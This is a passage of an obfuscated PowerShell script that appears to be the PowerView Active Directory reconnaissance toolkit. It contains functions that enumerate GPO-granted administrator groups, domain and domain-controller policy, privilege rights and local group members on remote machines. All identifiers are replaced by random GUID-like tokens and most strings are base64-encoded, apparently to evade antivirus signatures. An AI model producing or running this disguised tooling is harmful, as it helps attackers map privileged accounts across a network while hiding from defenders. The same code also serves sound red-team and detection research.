    ${ac94da6a0ad840b490739412fd8209c4} += Get-NetGroup -afa30c601e734738b32424a6234484e4 ${afa30c601e734738b32424a6234484e4} -a3bf4f2494234d89b62febc9f379f624 ${a3bf4f2494234d89b62febc9f379f624} -c8e7665cd4cc41d88229c3536a114f1b ${c8e7665cd4cc41d88229c3536a114f1b} -dfa85e24773f431f91e73de068d7b94e ${7bb94567d4954c60aa308f6d329d175c} -d4b201a98f994b6a84279c99ec61a4dc
    if(${ac94da6a0ad840b490739412fd8209c4} -isnot [system.array]) { ${ac94da6a0ad840b490739412fd8209c4} = @(${ac94da6a0ad840b490739412fd8209c4}) }
    Write-Verbose "Effective target sids: ${ac94da6a0ad840b490739412fd8209c4}"
    ${565d8e16080646b58c82937f45daf31a} =  @{
        'Domain' = ${afa30c601e734738b32424a6234484e4}
        'DomainController' = ${a3bf4f2494234d89b62febc9f379f624}
        'UsePSDrive' = ${d304e44efca5442daf28ae2e0a813411}
        'PageSize' = ${c8e7665cd4cc41d88229c3536a114f1b}
    }
    ${fff7c7a209a844c9bbcf7d3c19b4031f} = Get-NetGPOGroup @565d8e16080646b58c82937f45daf31a | % {
        if ($_.members) {
            $_.members = $_.members | ? {$_} | % {
                if($_ -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AA==')))) {
                    $_
                }
                else {
                    Convert-NameToSid -d812a92a48c94a1ab80bf8ce2384cab2 $_ -afa30c601e734738b32424a6234484e4 ${afa30c601e734738b32424a6234484e4}
                }
            }
            if($_.members -isnot [system.array]) { $_.members = @($_.members) }
            if($_.memberof -isnot [system.array]) { $_.memberof = @($_.memberof) }
            if($_.members) {
                try {
                    if( (diff -ReferenceObject $_.members -DifferenceObject ${ac94da6a0ad840b490739412fd8209c4} -IncludeEqual -ExcludeDifferent) ) {
                        if ($_.memberof -contains ${7d77ae4ef4164464be811769bc637da5}) {
                            $_
                        }
                    }
                } 
                catch {
                    Write-Debug "Error comparing members and ${ac94da6a0ad840b490739412fd8209c4} : $_"
                }
            }
        }
    }
    Write-Verbose "GPOgroups: ${fff7c7a209a844c9bbcf7d3c19b4031f}"
    ${4e9c29ec6b4742fcb8ff28a0f8af9524} = @{}
    ${fff7c7a209a844c9bbcf7d3c19b4031f} | ? {$_} | % {
        ${4c505fc5264045a0afa83225fbc0fc14} = $_.GPOName
        if( -not ${4e9c29ec6b4742fcb8ff28a0f8af9524}[${4c505fc5264045a0afa83225fbc0fc14}] ) {
            ${b99c1bd656aa46308141ed59f80f7353} = $_.GPODisplayName
            ${cc50ec12ea7f437d849d9ece323f1477} = $_.Filters
            Get-NetOU -afa30c601e734738b32424a6234484e4 ${afa30c601e734738b32424a6234484e4} -a3bf4f2494234d89b62febc9f379f624 ${a3bf4f2494234d89b62febc9f379f624} -b3dcc7338bfc4d97afb02a12d590c57a ${4c505fc5264045a0afa83225fbc0fc14} -c489e407a44b4d378d17e6f8021054c1 -c8e7665cd4cc41d88229c3536a114f1b ${c8e7665cd4cc41d88229c3536a114f1b} | % {
                if(${cc50ec12ea7f437d849d9ece323f1477}) {
                    ${8bc3f008681445a0a4be1800f6717ae4} = Get-NetComputer -c4d5e29aa5ae43dc97a75d43cbc64f02 $_.ADSpath -c489e407a44b4d378d17e6f8021054c1 -c8e7665cd4cc41d88229c3536a114f1b ${c8e7665cd4cc41d88229c3536a114f1b} | ? {
                        $_.adspath -match (${cc50ec12ea7f437d849d9ece323f1477}.Value)
                    } | % { $_.dnshostname }
                }
                else {
                    ${8bc3f008681445a0a4be1800f6717ae4} = Get-NetComputer -c4d5e29aa5ae43dc97a75d43cbc64f02 $_.ADSpath -c8e7665cd4cc41d88229c3536a114f1b ${c8e7665cd4cc41d88229c3536a114f1b}
                }
                ${95c2d43771414f2cad350ab328deaf80} = New-Object PSObject
                ${95c2d43771414f2cad350ab328deaf80} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQATgBhAG0AZQA='))) ${9c7046bb5a6c490ca7006886a4af9b17}
                ${95c2d43771414f2cad350ab328deaf80} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8AbgBhAG0AZQA='))) ${b99c1bd656aa46308141ed59f80f7353}
                ${95c2d43771414f2cad350ab328deaf80} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8AZwB1AGkAZAA='))) ${4c505fc5264045a0afa83225fbc0fc14}
                ${95c2d43771414f2cad350ab328deaf80} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AdABhAGkAbgBlAHIATgBhAG0AZQA='))) $_.distinguishedname
                ${95c2d43771414f2cad350ab328deaf80} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAHMA'))) ${8bc3f008681445a0a4be1800f6717ae4}
                ${95c2d43771414f2cad350ab328deaf80}
            }
            ${4e9c29ec6b4742fcb8ff28a0f8af9524}[${4c505fc5264045a0afa83225fbc0fc14}] = $True
        }
    }
}
function Find-GPOComputerAdmin {
    [CmdletBinding()]
    Param (
        [Parameter(ValueFromPipeline=$True)]
        [String]
        ${c096522c7bbe4c7aaadf99843e3b09fb},
        [String]
        ${d96f91df8b9c420494e8ed136faa0bfd},
        [String]
        ${afa30c601e734738b32424a6234484e4},
        [String]
        ${a3bf4f2494234d89b62febc9f379f624},
        [Switch]
        ${d722399685d842b19fa5d48261792164},
        [String]
        ${cfa166c27b774b7fb2a8aa4298b6f647} = 'Administrators',
        [Switch]
        ${d304e44efca5442daf28ae2e0a813411},
        [ValidateRange(1,10000)] 
        [Int]
        ${c8e7665cd4cc41d88229c3536a114f1b} = 200
    )
    process {
        if(!${c096522c7bbe4c7aaadf99843e3b09fb} -and !${d96f91df8b9c420494e8ed136faa0bfd}) {
            Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQBDAG8AbQBwAHUAdABlAHIATgBhAG0AZQAgAG8AcgAgAC0ATwBVAE4AYQBtAGUAIABtAHUAcwB0ACAAYgBlACAAcAByAG8AdgBpAGQAZQBkAA==')))
        }
        if(${c096522c7bbe4c7aaadf99843e3b09fb}) {
            ${f8536cc1604d4f61841c9296a03c508d} = Get-NetComputer -c096522c7bbe4c7aaadf99843e3b09fb ${c096522c7bbe4c7aaadf99843e3b09fb} -afa30c601e734738b32424a6234484e4 ${afa30c601e734738b32424a6234484e4} -a3bf4f2494234d89b62febc9f379f624 ${a3bf4f2494234d89b62febc9f379f624} -c489e407a44b4d378d17e6f8021054c1 -c8e7665cd4cc41d88229c3536a114f1b ${c8e7665cd4cc41d88229c3536a114f1b}
            if(!${f8536cc1604d4f61841c9296a03c508d}) {
                throw "Computer ${5c10572590774a67ad57cb4f99935a3e} in domain '${afa30c601e734738b32424a6234484e4}' not found!"
            }
            ForEach(${5c10572590774a67ad57cb4f99935a3e} in ${f8536cc1604d4f61841c9296a03c508d}) {
                ${6e04c9858ca2408095d4fac570ac3004} = ${5c10572590774a67ad57cb4f99935a3e}.distinguishedname
                ${3b1e5a45ca224f2a9479b45d2fdf5332} = ${6e04c9858ca2408095d4fac570ac3004}.split(",") | Foreach-Object {
                    if($_.startswith($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBVAD0A'))))) {
                        ${6e04c9858ca2408095d4fac570ac3004}.substring(${6e04c9858ca2408095d4fac570ac3004}.indexof($_))
                    }
                }
            }
        }
        else {
            ${3b1e5a45ca224f2a9479b45d2fdf5332} = @(${d96f91df8b9c420494e8ed136faa0bfd})
        }
        Write-Verbose "Target OUs: ${3b1e5a45ca224f2a9479b45d2fdf5332}"
        ${3b1e5a45ca224f2a9479b45d2fdf5332} | ? {$_} | Foreach-Object {
            ${f7f3f5ae7b52406b9158d8d4847a010d} = $_
            ${fff7c7a209a844c9bbcf7d3c19b4031f} = Get-NetOU -afa30c601e734738b32424a6234484e4 ${afa30c601e734738b32424a6234484e4} -a3bf4f2494234d89b62febc9f379f624 ${a3bf4f2494234d89b62febc9f379f624} -c4d5e29aa5ae43dc97a75d43cbc64f02 $_ -c489e407a44b4d378d17e6f8021054c1 -c8e7665cd4cc41d88229c3536a114f1b ${c8e7665cd4cc41d88229c3536a114f1b} | Foreach-Object { 
                $_.gplink.split("][") | Foreach-Object {
                    if ($_.startswith($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUAA='))))) {
                        $_.split(";")[0]
                    }
                }
            } | Foreach-Object {
                ${565d8e16080646b58c82937f45daf31a} =  @{
                    'Domain' = ${afa30c601e734738b32424a6234484e4}
                    'DomainController' = ${a3bf4f2494234d89b62febc9f379f624}
                    'ADSpath' = $_
                    'UsePSDrive' = ${d304e44efca5442daf28ae2e0a813411}
                    'PageSize' = ${c8e7665cd4cc41d88229c3536a114f1b}
                }
                Get-NetGPOGroup @565d8e16080646b58c82937f45daf31a
            }
            ${fff7c7a209a844c9bbcf7d3c19b4031f} | ? {$_} | Foreach-Object {
                ${69a16b6ef49e4d81919b7bfc7e57bdc4} = $_
                ${69a16b6ef49e4d81919b7bfc7e57bdc4}.members | Foreach-Object {
                    ${b2929ecf6cd74a84bce9ccd2f5622fbb} = Get-ADObject -afa30c601e734738b32424a6234484e4 ${afa30c601e734738b32424a6234484e4} -a3bf4f2494234d89b62febc9f379f624 ${a3bf4f2494234d89b62febc9f379f624} $_ -c8e7665cd4cc41d88229c3536a114f1b ${c8e7665cd4cc41d88229c3536a114f1b}
                    ${fe79dde77af0465a89431f3aa8594ce9} = New-Object PSObject
                    ${fe79dde77af0465a89431f3aa8594ce9} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) ${c096522c7bbe4c7aaadf99843e3b09fb}
                    ${fe79dde77af0465a89431f3aa8594ce9} | Add-Member Noteproperty 'OU' ${f7f3f5ae7b52406b9158d8d4847a010d}
                    ${fe79dde77af0465a89431f3aa8594ce9} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8ARABpAHMAcABsAGEAeQBOAGEAbQBlAA=='))) ${69a16b6ef49e4d81919b7bfc7e57bdc4}.GPODisplayName
                    ${fe79dde77af0465a89431f3aa8594ce9} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8AUABhAHQAaAA='))) ${69a16b6ef49e4d81919b7bfc7e57bdc4}.GPOPath
                    ${fe79dde77af0465a89431f3aa8594ce9} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQATgBhAG0AZQA='))) ${b2929ecf6cd74a84bce9ccd2f5622fbb}.name
                    ${fe79dde77af0465a89431f3aa8594ce9} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQARABOAA=='))) ${b2929ecf6cd74a84bce9ccd2f5622fbb}.distinguishedname
                    ${fe79dde77af0465a89431f3aa8594ce9} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQAUwBJAEQA'))) $_
                    ${fe79dde77af0465a89431f3aa8594ce9} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEcAcgBvAHUAcAA='))) $(${b2929ecf6cd74a84bce9ccd2f5622fbb}.samaccounttype -notmatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('OAAwADUAMwAwADYAMwA2ADgA'))))
                    ${fe79dde77af0465a89431f3aa8594ce9} 
                    if(${d722399685d842b19fa5d48261792164} -and ${fe79dde77af0465a89431f3aa8594ce9}.isGroup) {
                        Get-NetGroupMember -d72c41ecfd1e4100a077ef856e028545 $_ -c489e407a44b4d378d17e6f8021054c1 -d722399685d842b19fa5d48261792164 -c8e7665cd4cc41d88229c3536a114f1b ${c8e7665cd4cc41d88229c3536a114f1b} | Foreach-Object {
                            ${90aa09aa19244112b72f8e1a37891707} = $_.distinguishedName
                            ${b12c15582cce43a4ab90d2f8e2ab306a} = ${90aa09aa19244112b72f8e1a37891707}.subString(${90aa09aa19244112b72f8e1a37891707}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                            if ($_.samAccountType -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('OAAwADUAMwAwADYAMwA2ADgA')))) {
                                ${54a514691a304263a5e1f4b75679c082} = $True
                            }
                            else {
                                ${54a514691a304263a5e1f4b75679c082} = $False
                            }
                            if ($_.samAccountName) {
                                ${a93a7a3a61c64d07a2f6770952369f81} = $_.samAccountName
                            }
                            else {
                                try {
                                    ${a93a7a3a61c64d07a2f6770952369f81} = Convert-SidToName $_.cn
                                }
                                catch {
                                    ${a93a7a3a61c64d07a2f6770952369f81} = $_.cn
                                }
                            }
                            ${fe79dde77af0465a89431f3aa8594ce9} = New-Object PSObject
                            ${fe79dde77af0465a89431f3aa8594ce9} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) ${c096522c7bbe4c7aaadf99843e3b09fb}
                            ${fe79dde77af0465a89431f3aa8594ce9} | Add-Member Noteproperty 'OU' ${f7f3f5ae7b52406b9158d8d4847a010d}
                            ${fe79dde77af0465a89431f3aa8594ce9} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8ARABpAHMAcABsAGEAeQBOAGEAbQBlAA=='))) ${69a16b6ef49e4d81919b7bfc7e57bdc4}.GPODisplayName
                            ${fe79dde77af0465a89431f3aa8594ce9} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8AUABhAHQAaAA='))) ${69a16b6ef49e4d81919b7bfc7e57bdc4}.GPOPath
                            ${fe79dde77af0465a89431f3aa8594ce9} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQATgBhAG0AZQA='))) ${a93a7a3a61c64d07a2f6770952369f81}
                            ${fe79dde77af0465a89431f3aa8594ce9} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQARABOAA=='))) ${90aa09aa19244112b72f8e1a37891707}
                            ${fe79dde77af0465a89431f3aa8594ce9} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQAUwBJAEQA'))) $_.objectsid
                            ${fe79dde77af0465a89431f3aa8594ce9} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEcAcgBvAHUAcAA='))) ${54a514691a304263a5e1f4b75679c082}
                            ${fe79dde77af0465a89431f3aa8594ce9} 
                        }
                    }
                }
            }
        }
    }
}
function Get-DomainPolicy {
    [CmdletBinding()]
    Param (
        [String]
        [ValidateSet("Domain","DC")]
        ${b13a581cea27435fb5fddea82ffa6a86} ="Domain",
        [String]
        ${afa30c601e734738b32424a6234484e4},
        [String]
        ${a3bf4f2494234d89b62febc9f379f624},
        [Switch]
        ${bbdf9ae2b8734a70ab6da234f7f977d1},
        [Switch]
        ${d304e44efca5442daf28ae2e0a813411}
    )
    if(${b13a581cea27435fb5fddea82ffa6a86} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))) {
        ${69a16b6ef49e4d81919b7bfc7e57bdc4} = Get-NetGPO -afa30c601e734738b32424a6234484e4 ${afa30c601e734738b32424a6234484e4} -a3bf4f2494234d89b62febc9f379f624 ${a3bf4f2494234d89b62febc9f379f624} -b99c1bd656aa46308141ed59f80f7353 $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ewAzADEAQgAyAEYAMwA0ADAALQAwADEANgBEAC0AMQAxAEQAMgAtADkANAA1AEYALQAwADAAQwAwADQARgBCADkAOAA0AEYAOQB9AA==')))
        if(${69a16b6ef49e4d81919b7bfc7e57bdc4}) {
            ${d416eeaf422b4dc4a5730ec43e3129e2} = ${69a16b6ef49e4d81919b7bfc7e57bdc4}.gpcfilesyspath + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABNAEEAQwBIAEkATgBFAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzACAATgBUAFwAUwBlAGMARQBkAGkAdABcAEcAcAB0AFQAbQBwAGwALgBpAG4AZgA=')))
            ${92495dd11f2f46628343d47b31349dc0} =  @{
                'GptTmplPath' = ${d416eeaf422b4dc4a5730ec43e3129e2}
                'UsePSDrive' = ${d304e44efca5442daf28ae2e0a813411}
            }
            Get-GptTmpl @92495dd11f2f46628343d47b31349dc0
        }
    }
    elseif(${b13a581cea27435fb5fddea82ffa6a86} -eq "DC") {
        ${69a16b6ef49e4d81919b7bfc7e57bdc4} = Get-NetGPO -afa30c601e734738b32424a6234484e4 ${afa30c601e734738b32424a6234484e4} -a3bf4f2494234d89b62febc9f379f624 ${a3bf4f2494234d89b62febc9f379f624} -b99c1bd656aa46308141ed59f80f7353 $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ewA2AEEAQwAxADcAOAA2AEMALQAwADEANgBGAC0AMQAxAEQAMgAtADkANAA1AEYALQAwADAAQwAwADQARgBCADkAOAA0AEYAOQB9AA==')))
        if(${69a16b6ef49e4d81919b7bfc7e57bdc4}) {
            ${d416eeaf422b4dc4a5730ec43e3129e2} = ${69a16b6ef49e4d81919b7bfc7e57bdc4}.gpcfilesyspath + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABNAEEAQwBIAEkATgBFAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzACAATgBUAFwAUwBlAGMARQBkAGkAdABcAEcAcAB0AFQAbQBwAGwALgBpAG4AZgA=')))
            ${92495dd11f2f46628343d47b31349dc0} =  @{
                'GptTmplPath' = ${d416eeaf422b4dc4a5730ec43e3129e2}
                'UsePSDrive' = ${d304e44efca5442daf28ae2e0a813411}
            }
            Get-GptTmpl @92495dd11f2f46628343d47b31349dc0 | Foreach-Object {
                if(${bbdf9ae2b8734a70ab6da234f7f977d1}) {
                    ${7e6a83fd76e540c18a6a0338f55d74b6} = New-Object PSObject
                    $_.psobject.properties | Foreach-Object {
                        if( $_.Name -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAdgBpAGwAZQBnAGUAUgBpAGcAaAB0AHMA')))) {
                            ${4350e894278747149f5c56e753a54cb8} = New-Object PSObject
                            $_.Value.psobject.properties | Foreach-Object {
                                ${7cec28d15b114080ad6b502c42b39341} = $_.Value | Foreach-Object {
                                    try {
                                        if($_ -isnot [System.Array]) { 
                                            Convert-SidToName $_ 
                                        }
                                        else {
                                            $_ | Foreach-Object { Convert-SidToName $_ }
                                        }
                                    }
                                    catch {
                                        Write-Debug "Error resolving SID : $_"
                                    }
                                }
                                ${4350e894278747149f5c56e753a54cb8} | Add-Member Noteproperty $_.Name ${7cec28d15b114080ad6b502c42b39341}
                            }
                            ${7e6a83fd76e540c18a6a0338f55d74b6} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAdgBpAGwAZQBnAGUAUgBpAGcAaAB0AHMA'))) ${4350e894278747149f5c56e753a54cb8}
                        }
                        else {
                            ${7e6a83fd76e540c18a6a0338f55d74b6} | Add-Member Noteproperty $_.Name $_.Value
                        }
                    }
                    ${7e6a83fd76e540c18a6a0338f55d74b6}
                }
                else { $_ }
            }
        }
    }
}
function Get-NetLocalGroup {
    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [Alias('HostName')]
        [String]
        ${c096522c7bbe4c7aaadf99843e3b09fb} = 'localhost',
        [ValidateScript({Test-Path -Path $_ })]
        [Alias('HostList')]
        [String]
        ${b58b7e66c34147d0b1030dea35e43084},
        [String]
        ${a0852a4c33684bf0877105c6da3a9074} = 'Administrators',
        [Switch]
        ${c83a4b57597844dda4422c0af530ef74},
        [Switch]
        ${d722399685d842b19fa5d48261792164}
    )
    begin {
        if ((-not ${c83a4b57597844dda4422c0af530ef74}) -and (-not ${a0852a4c33684bf0877105c6da3a9074})) {
            ${0358d92d00f6461da1d4927b250761af} = New-Object System.Security.Principal.SecurityIdentifier($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA0ADQA'))))
            ${2290725f4be74af8a2d426ee8114d574} = ${0358d92d00f6461da1d4927b250761af}.Translate( [System.Security.Principal.NTAccount])
            ${a0852a4c33684bf0877105c6da3a9074} = (${2290725f4be74af8a2d426ee8114d574}.Value).Split('\')[1]
        }
    }
    process {
        ${1e595e60a54b40c6a321d2b7b862f49d} = @()
        if(${b58b7e66c34147d0b1030dea35e43084}) {
            ${1e595e60a54b40c6a321d2b7b862f49d} = gc -Path ${b58b7e66c34147d0b1030dea35e43084}
        }
        else {
            ${1e595e60a54b40c6a321d2b7b862f49d} += Get-NameField -b2929ecf6cd74a84bce9ccd2f5622fbb ${c096522c7bbe4c7aaadf99843e3b09fb}
        }
        ForEach($Server in ${1e595e60a54b40c6a321d2b7b862f49d}) {
            try {
                if(${c83a4b57597844dda4422c0af530ef74}) {
                    ${5c10572590774a67ad57cb4f99935a3e} = [ADSI]"WinNT://$Server,computer"
                    ${5c10572590774a67ad57cb4f99935a3e}.psbase.children | ? { $_.psbase.schemaClassName -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZwByAG8AdQBwAA=='))) } | % {
                        ${e84898b3b02d436697861293d1bb9448} = New-Object PSObject
                        ${e84898b3b02d436697861293d1bb9448} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA'))) $Server
                        ${e84898b3b02d436697861293d1bb9448} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAA=='))) ($_.name[0])
                        ${e84898b3b02d436697861293d1bb9448} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBJAEQA'))) ((New-Object System.Security.Principal.SecurityIdentifier $_.objectsid[0],0).Value)
                        ${e84898b3b02d436697861293d1bb9448} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAHMAYwByAGkAcAB0AGkAbwBuAA=='))) ($_.Description[0])
                        ${e84898b3b02d436697861293d1bb9448}
                    }
                }
                else {
                    ${cece1f195f3049e48a567091c9433159} = @($([ADSI]"WinNT://$Server/${a0852a4c33684bf0877105c6da3a9074}").psbase.Invoke($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAG0AYgBlAHIAcwA=')))))
                    ${cece1f195f3049e48a567091c9433159} | % {
                        ${9e7297d2e2074245a7bf5f660c80498f} = New-Object PSObject
                        ${9e7297d2e2074245a7bf5f660c80498f} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA'))) $Server
                        ${c4d5e29aa5ae43dc97a75d43cbc64f02} = ($_.GetType().InvokeMember($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAHMAcABhAHQAaAA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAUAByAG8AcABlAHIAdAB5AA=='))), $Null, $_, $Null)).Replace($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4ATgBUADoALwAvAA=='))), '')
                        ${be2d982dffb8435b9bc6f279ce7309a8} = Convert-NT4toCanonical -d812a92a48c94a1ab80bf8ce2384cab2 ${c4d5e29aa5ae43dc97a75d43cbc64f02}
                        if(${be2d982dffb8435b9bc6f279ce7309a8}) {
                            ${9a4ebdce95a04cb8a95d6924d9ec1dda} = ${be2d982dffb8435b9bc6f279ce7309a8}.split("/")[0]
                            ${4b97289701e7465c9e0a212da78db72a} = ${c4d5e29aa5ae43dc97a75d43cbc64f02}.split("/")[-1]
                            ${be2d982dffb8435b9bc6f279ce7309a8} = "${9a4ebdce95a04cb8a95d6924d9ec1dda}/${4b97289701e7465c9e0a212da78db72a}"
                            ${6edb1596e65c4c1ca2f9d7dcfa55fb8e} = $True
                        }
                        else {
                            ${be2d982dffb8435b9bc6f279ce7309a8} = ${c4d5e29aa5ae43dc97a75d43cbc64f02}
                            ${6edb1596e65c4c1ca2f9d7dcfa55fb8e} = $False
                        }
                        ${9e7297d2e2074245a7bf5f660c80498f} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAbwB1AG4AdABOAGEAbQBlAA=='))) ${be2d982dffb8435b9bc6f279ce7309a8}
                        ${9e7297d2e2074245a7bf5f660c80498f} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBJAEQA'))) ((New-Object System.Security.Principal.SecurityIdentifier($_.GetType().InvokeMember($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQAUwBJAEQA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAUAByAG8AcABlAHIAdAB5AA=='))), $Null, $_, $Null),0)).Value)
                        ${9e7297d2e2074245a7bf5f660c80498f} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAHMAYQBiAGwAZQBkAA=='))) $( if(-not ${6edb1596e65c4c1ca2f9d7dcfa55fb8e}) { try { $_.GetType().InvokeMember($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAbwB1AG4AdABEAGkAcwBhAGIAbABlAGQA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAUAByAG8AcABlAHIAdAB5AA=='))), $Null, $_, $Null) } catch { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBSAFIATwBSAA=='))) } } else { $False } )
                        ${def96a50aa8f4ca7b8e76e20c0eb5c87} = ($_.GetType().InvokeMember($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBsAGEAcwBzAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAUAByAG8AcABlAHIAdAB5AA=='))), $Null, $_, $Null) -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZwByAG8AdQBwAA=='))))
                        ${9e7297d2e2074245a7bf5f660c80498f} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEcAcgBvAHUAcAA='))) ${def96a50aa8f4ca7b8e76e20c0eb5c87}
                        ${9e7297d2e2074245a7bf5f660c80498f} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEQAbwBtAGEAaQBuAA=='))) ${6edb1596e65c4c1ca2f9d7dcfa55fb8e}
                        if(${def96a50aa8f4ca7b8e76e20c0eb5c87}) {
                            ${9e7297d2e2074245a7bf5f660c80498f} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABhAHMAdABMAG8AZwBpAG4A'))) ""
                        }
                        else {
                            try {
                                ${9e7297d2e2074245a7bf5f660c80498f} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABhAHMAdABMAG8AZwBpAG4A'))) ( $_.GetType().InvokeMember($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABhAHMAdABMAG8AZwBpAG4A'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAUAByAG8AcABlAHIAdAB5AA=='))), $Null, $_, $Null))
                            }
                            catch {
                                ${9e7297d2e2074245a7bf5f660c80498f} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABhAHMAdABMAG8AZwBpAG4A'))) ""
                            }
                        }
                        ${9e7297d2e2074245a7bf5f660c80498f}
                        if(${d722399685d842b19fa5d48261792164} -and ${6edb1596e65c4c1ca2f9d7dcfa55fb8e} -and ${def96a50aa8f4ca7b8e76e20c0eb5c87}) {
                            ${9a4ebdce95a04cb8a95d6924d9ec1dda} = ${be2d982dffb8435b9bc6f279ce7309a8}.split("/")[0]
                            ${a0852a4c33684bf0877105c6da3a9074} = ${be2d982dffb8435b9bc6f279ce7309a8}.split("/")[1].trim()
                            Get-NetGroupMember -a0852a4c33684bf0877105c6da3a9074 ${a0852a4c33684bf0877105c6da3a9074} -afa30c601e734738b32424a6234484e4 ${9a4ebdce95a04cb8a95d6924d9ec1dda} -c489e407a44b4d378d17e6f8021054c1 -d722399685d842b19fa5d48261792164 | % {
                                ${9e7297d2e2074245a7bf5f660c80498f} = New-Object PSObject
                                ${9e7297d2e2074245a7bf5f660c80498f} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA'))) "${9a4ebdce95a04cb8a95d6924d9ec1dda}/$($_.GroupName)"
                                ${90aa09aa19244112b72f8e1a37891707} = $_.distinguishedName
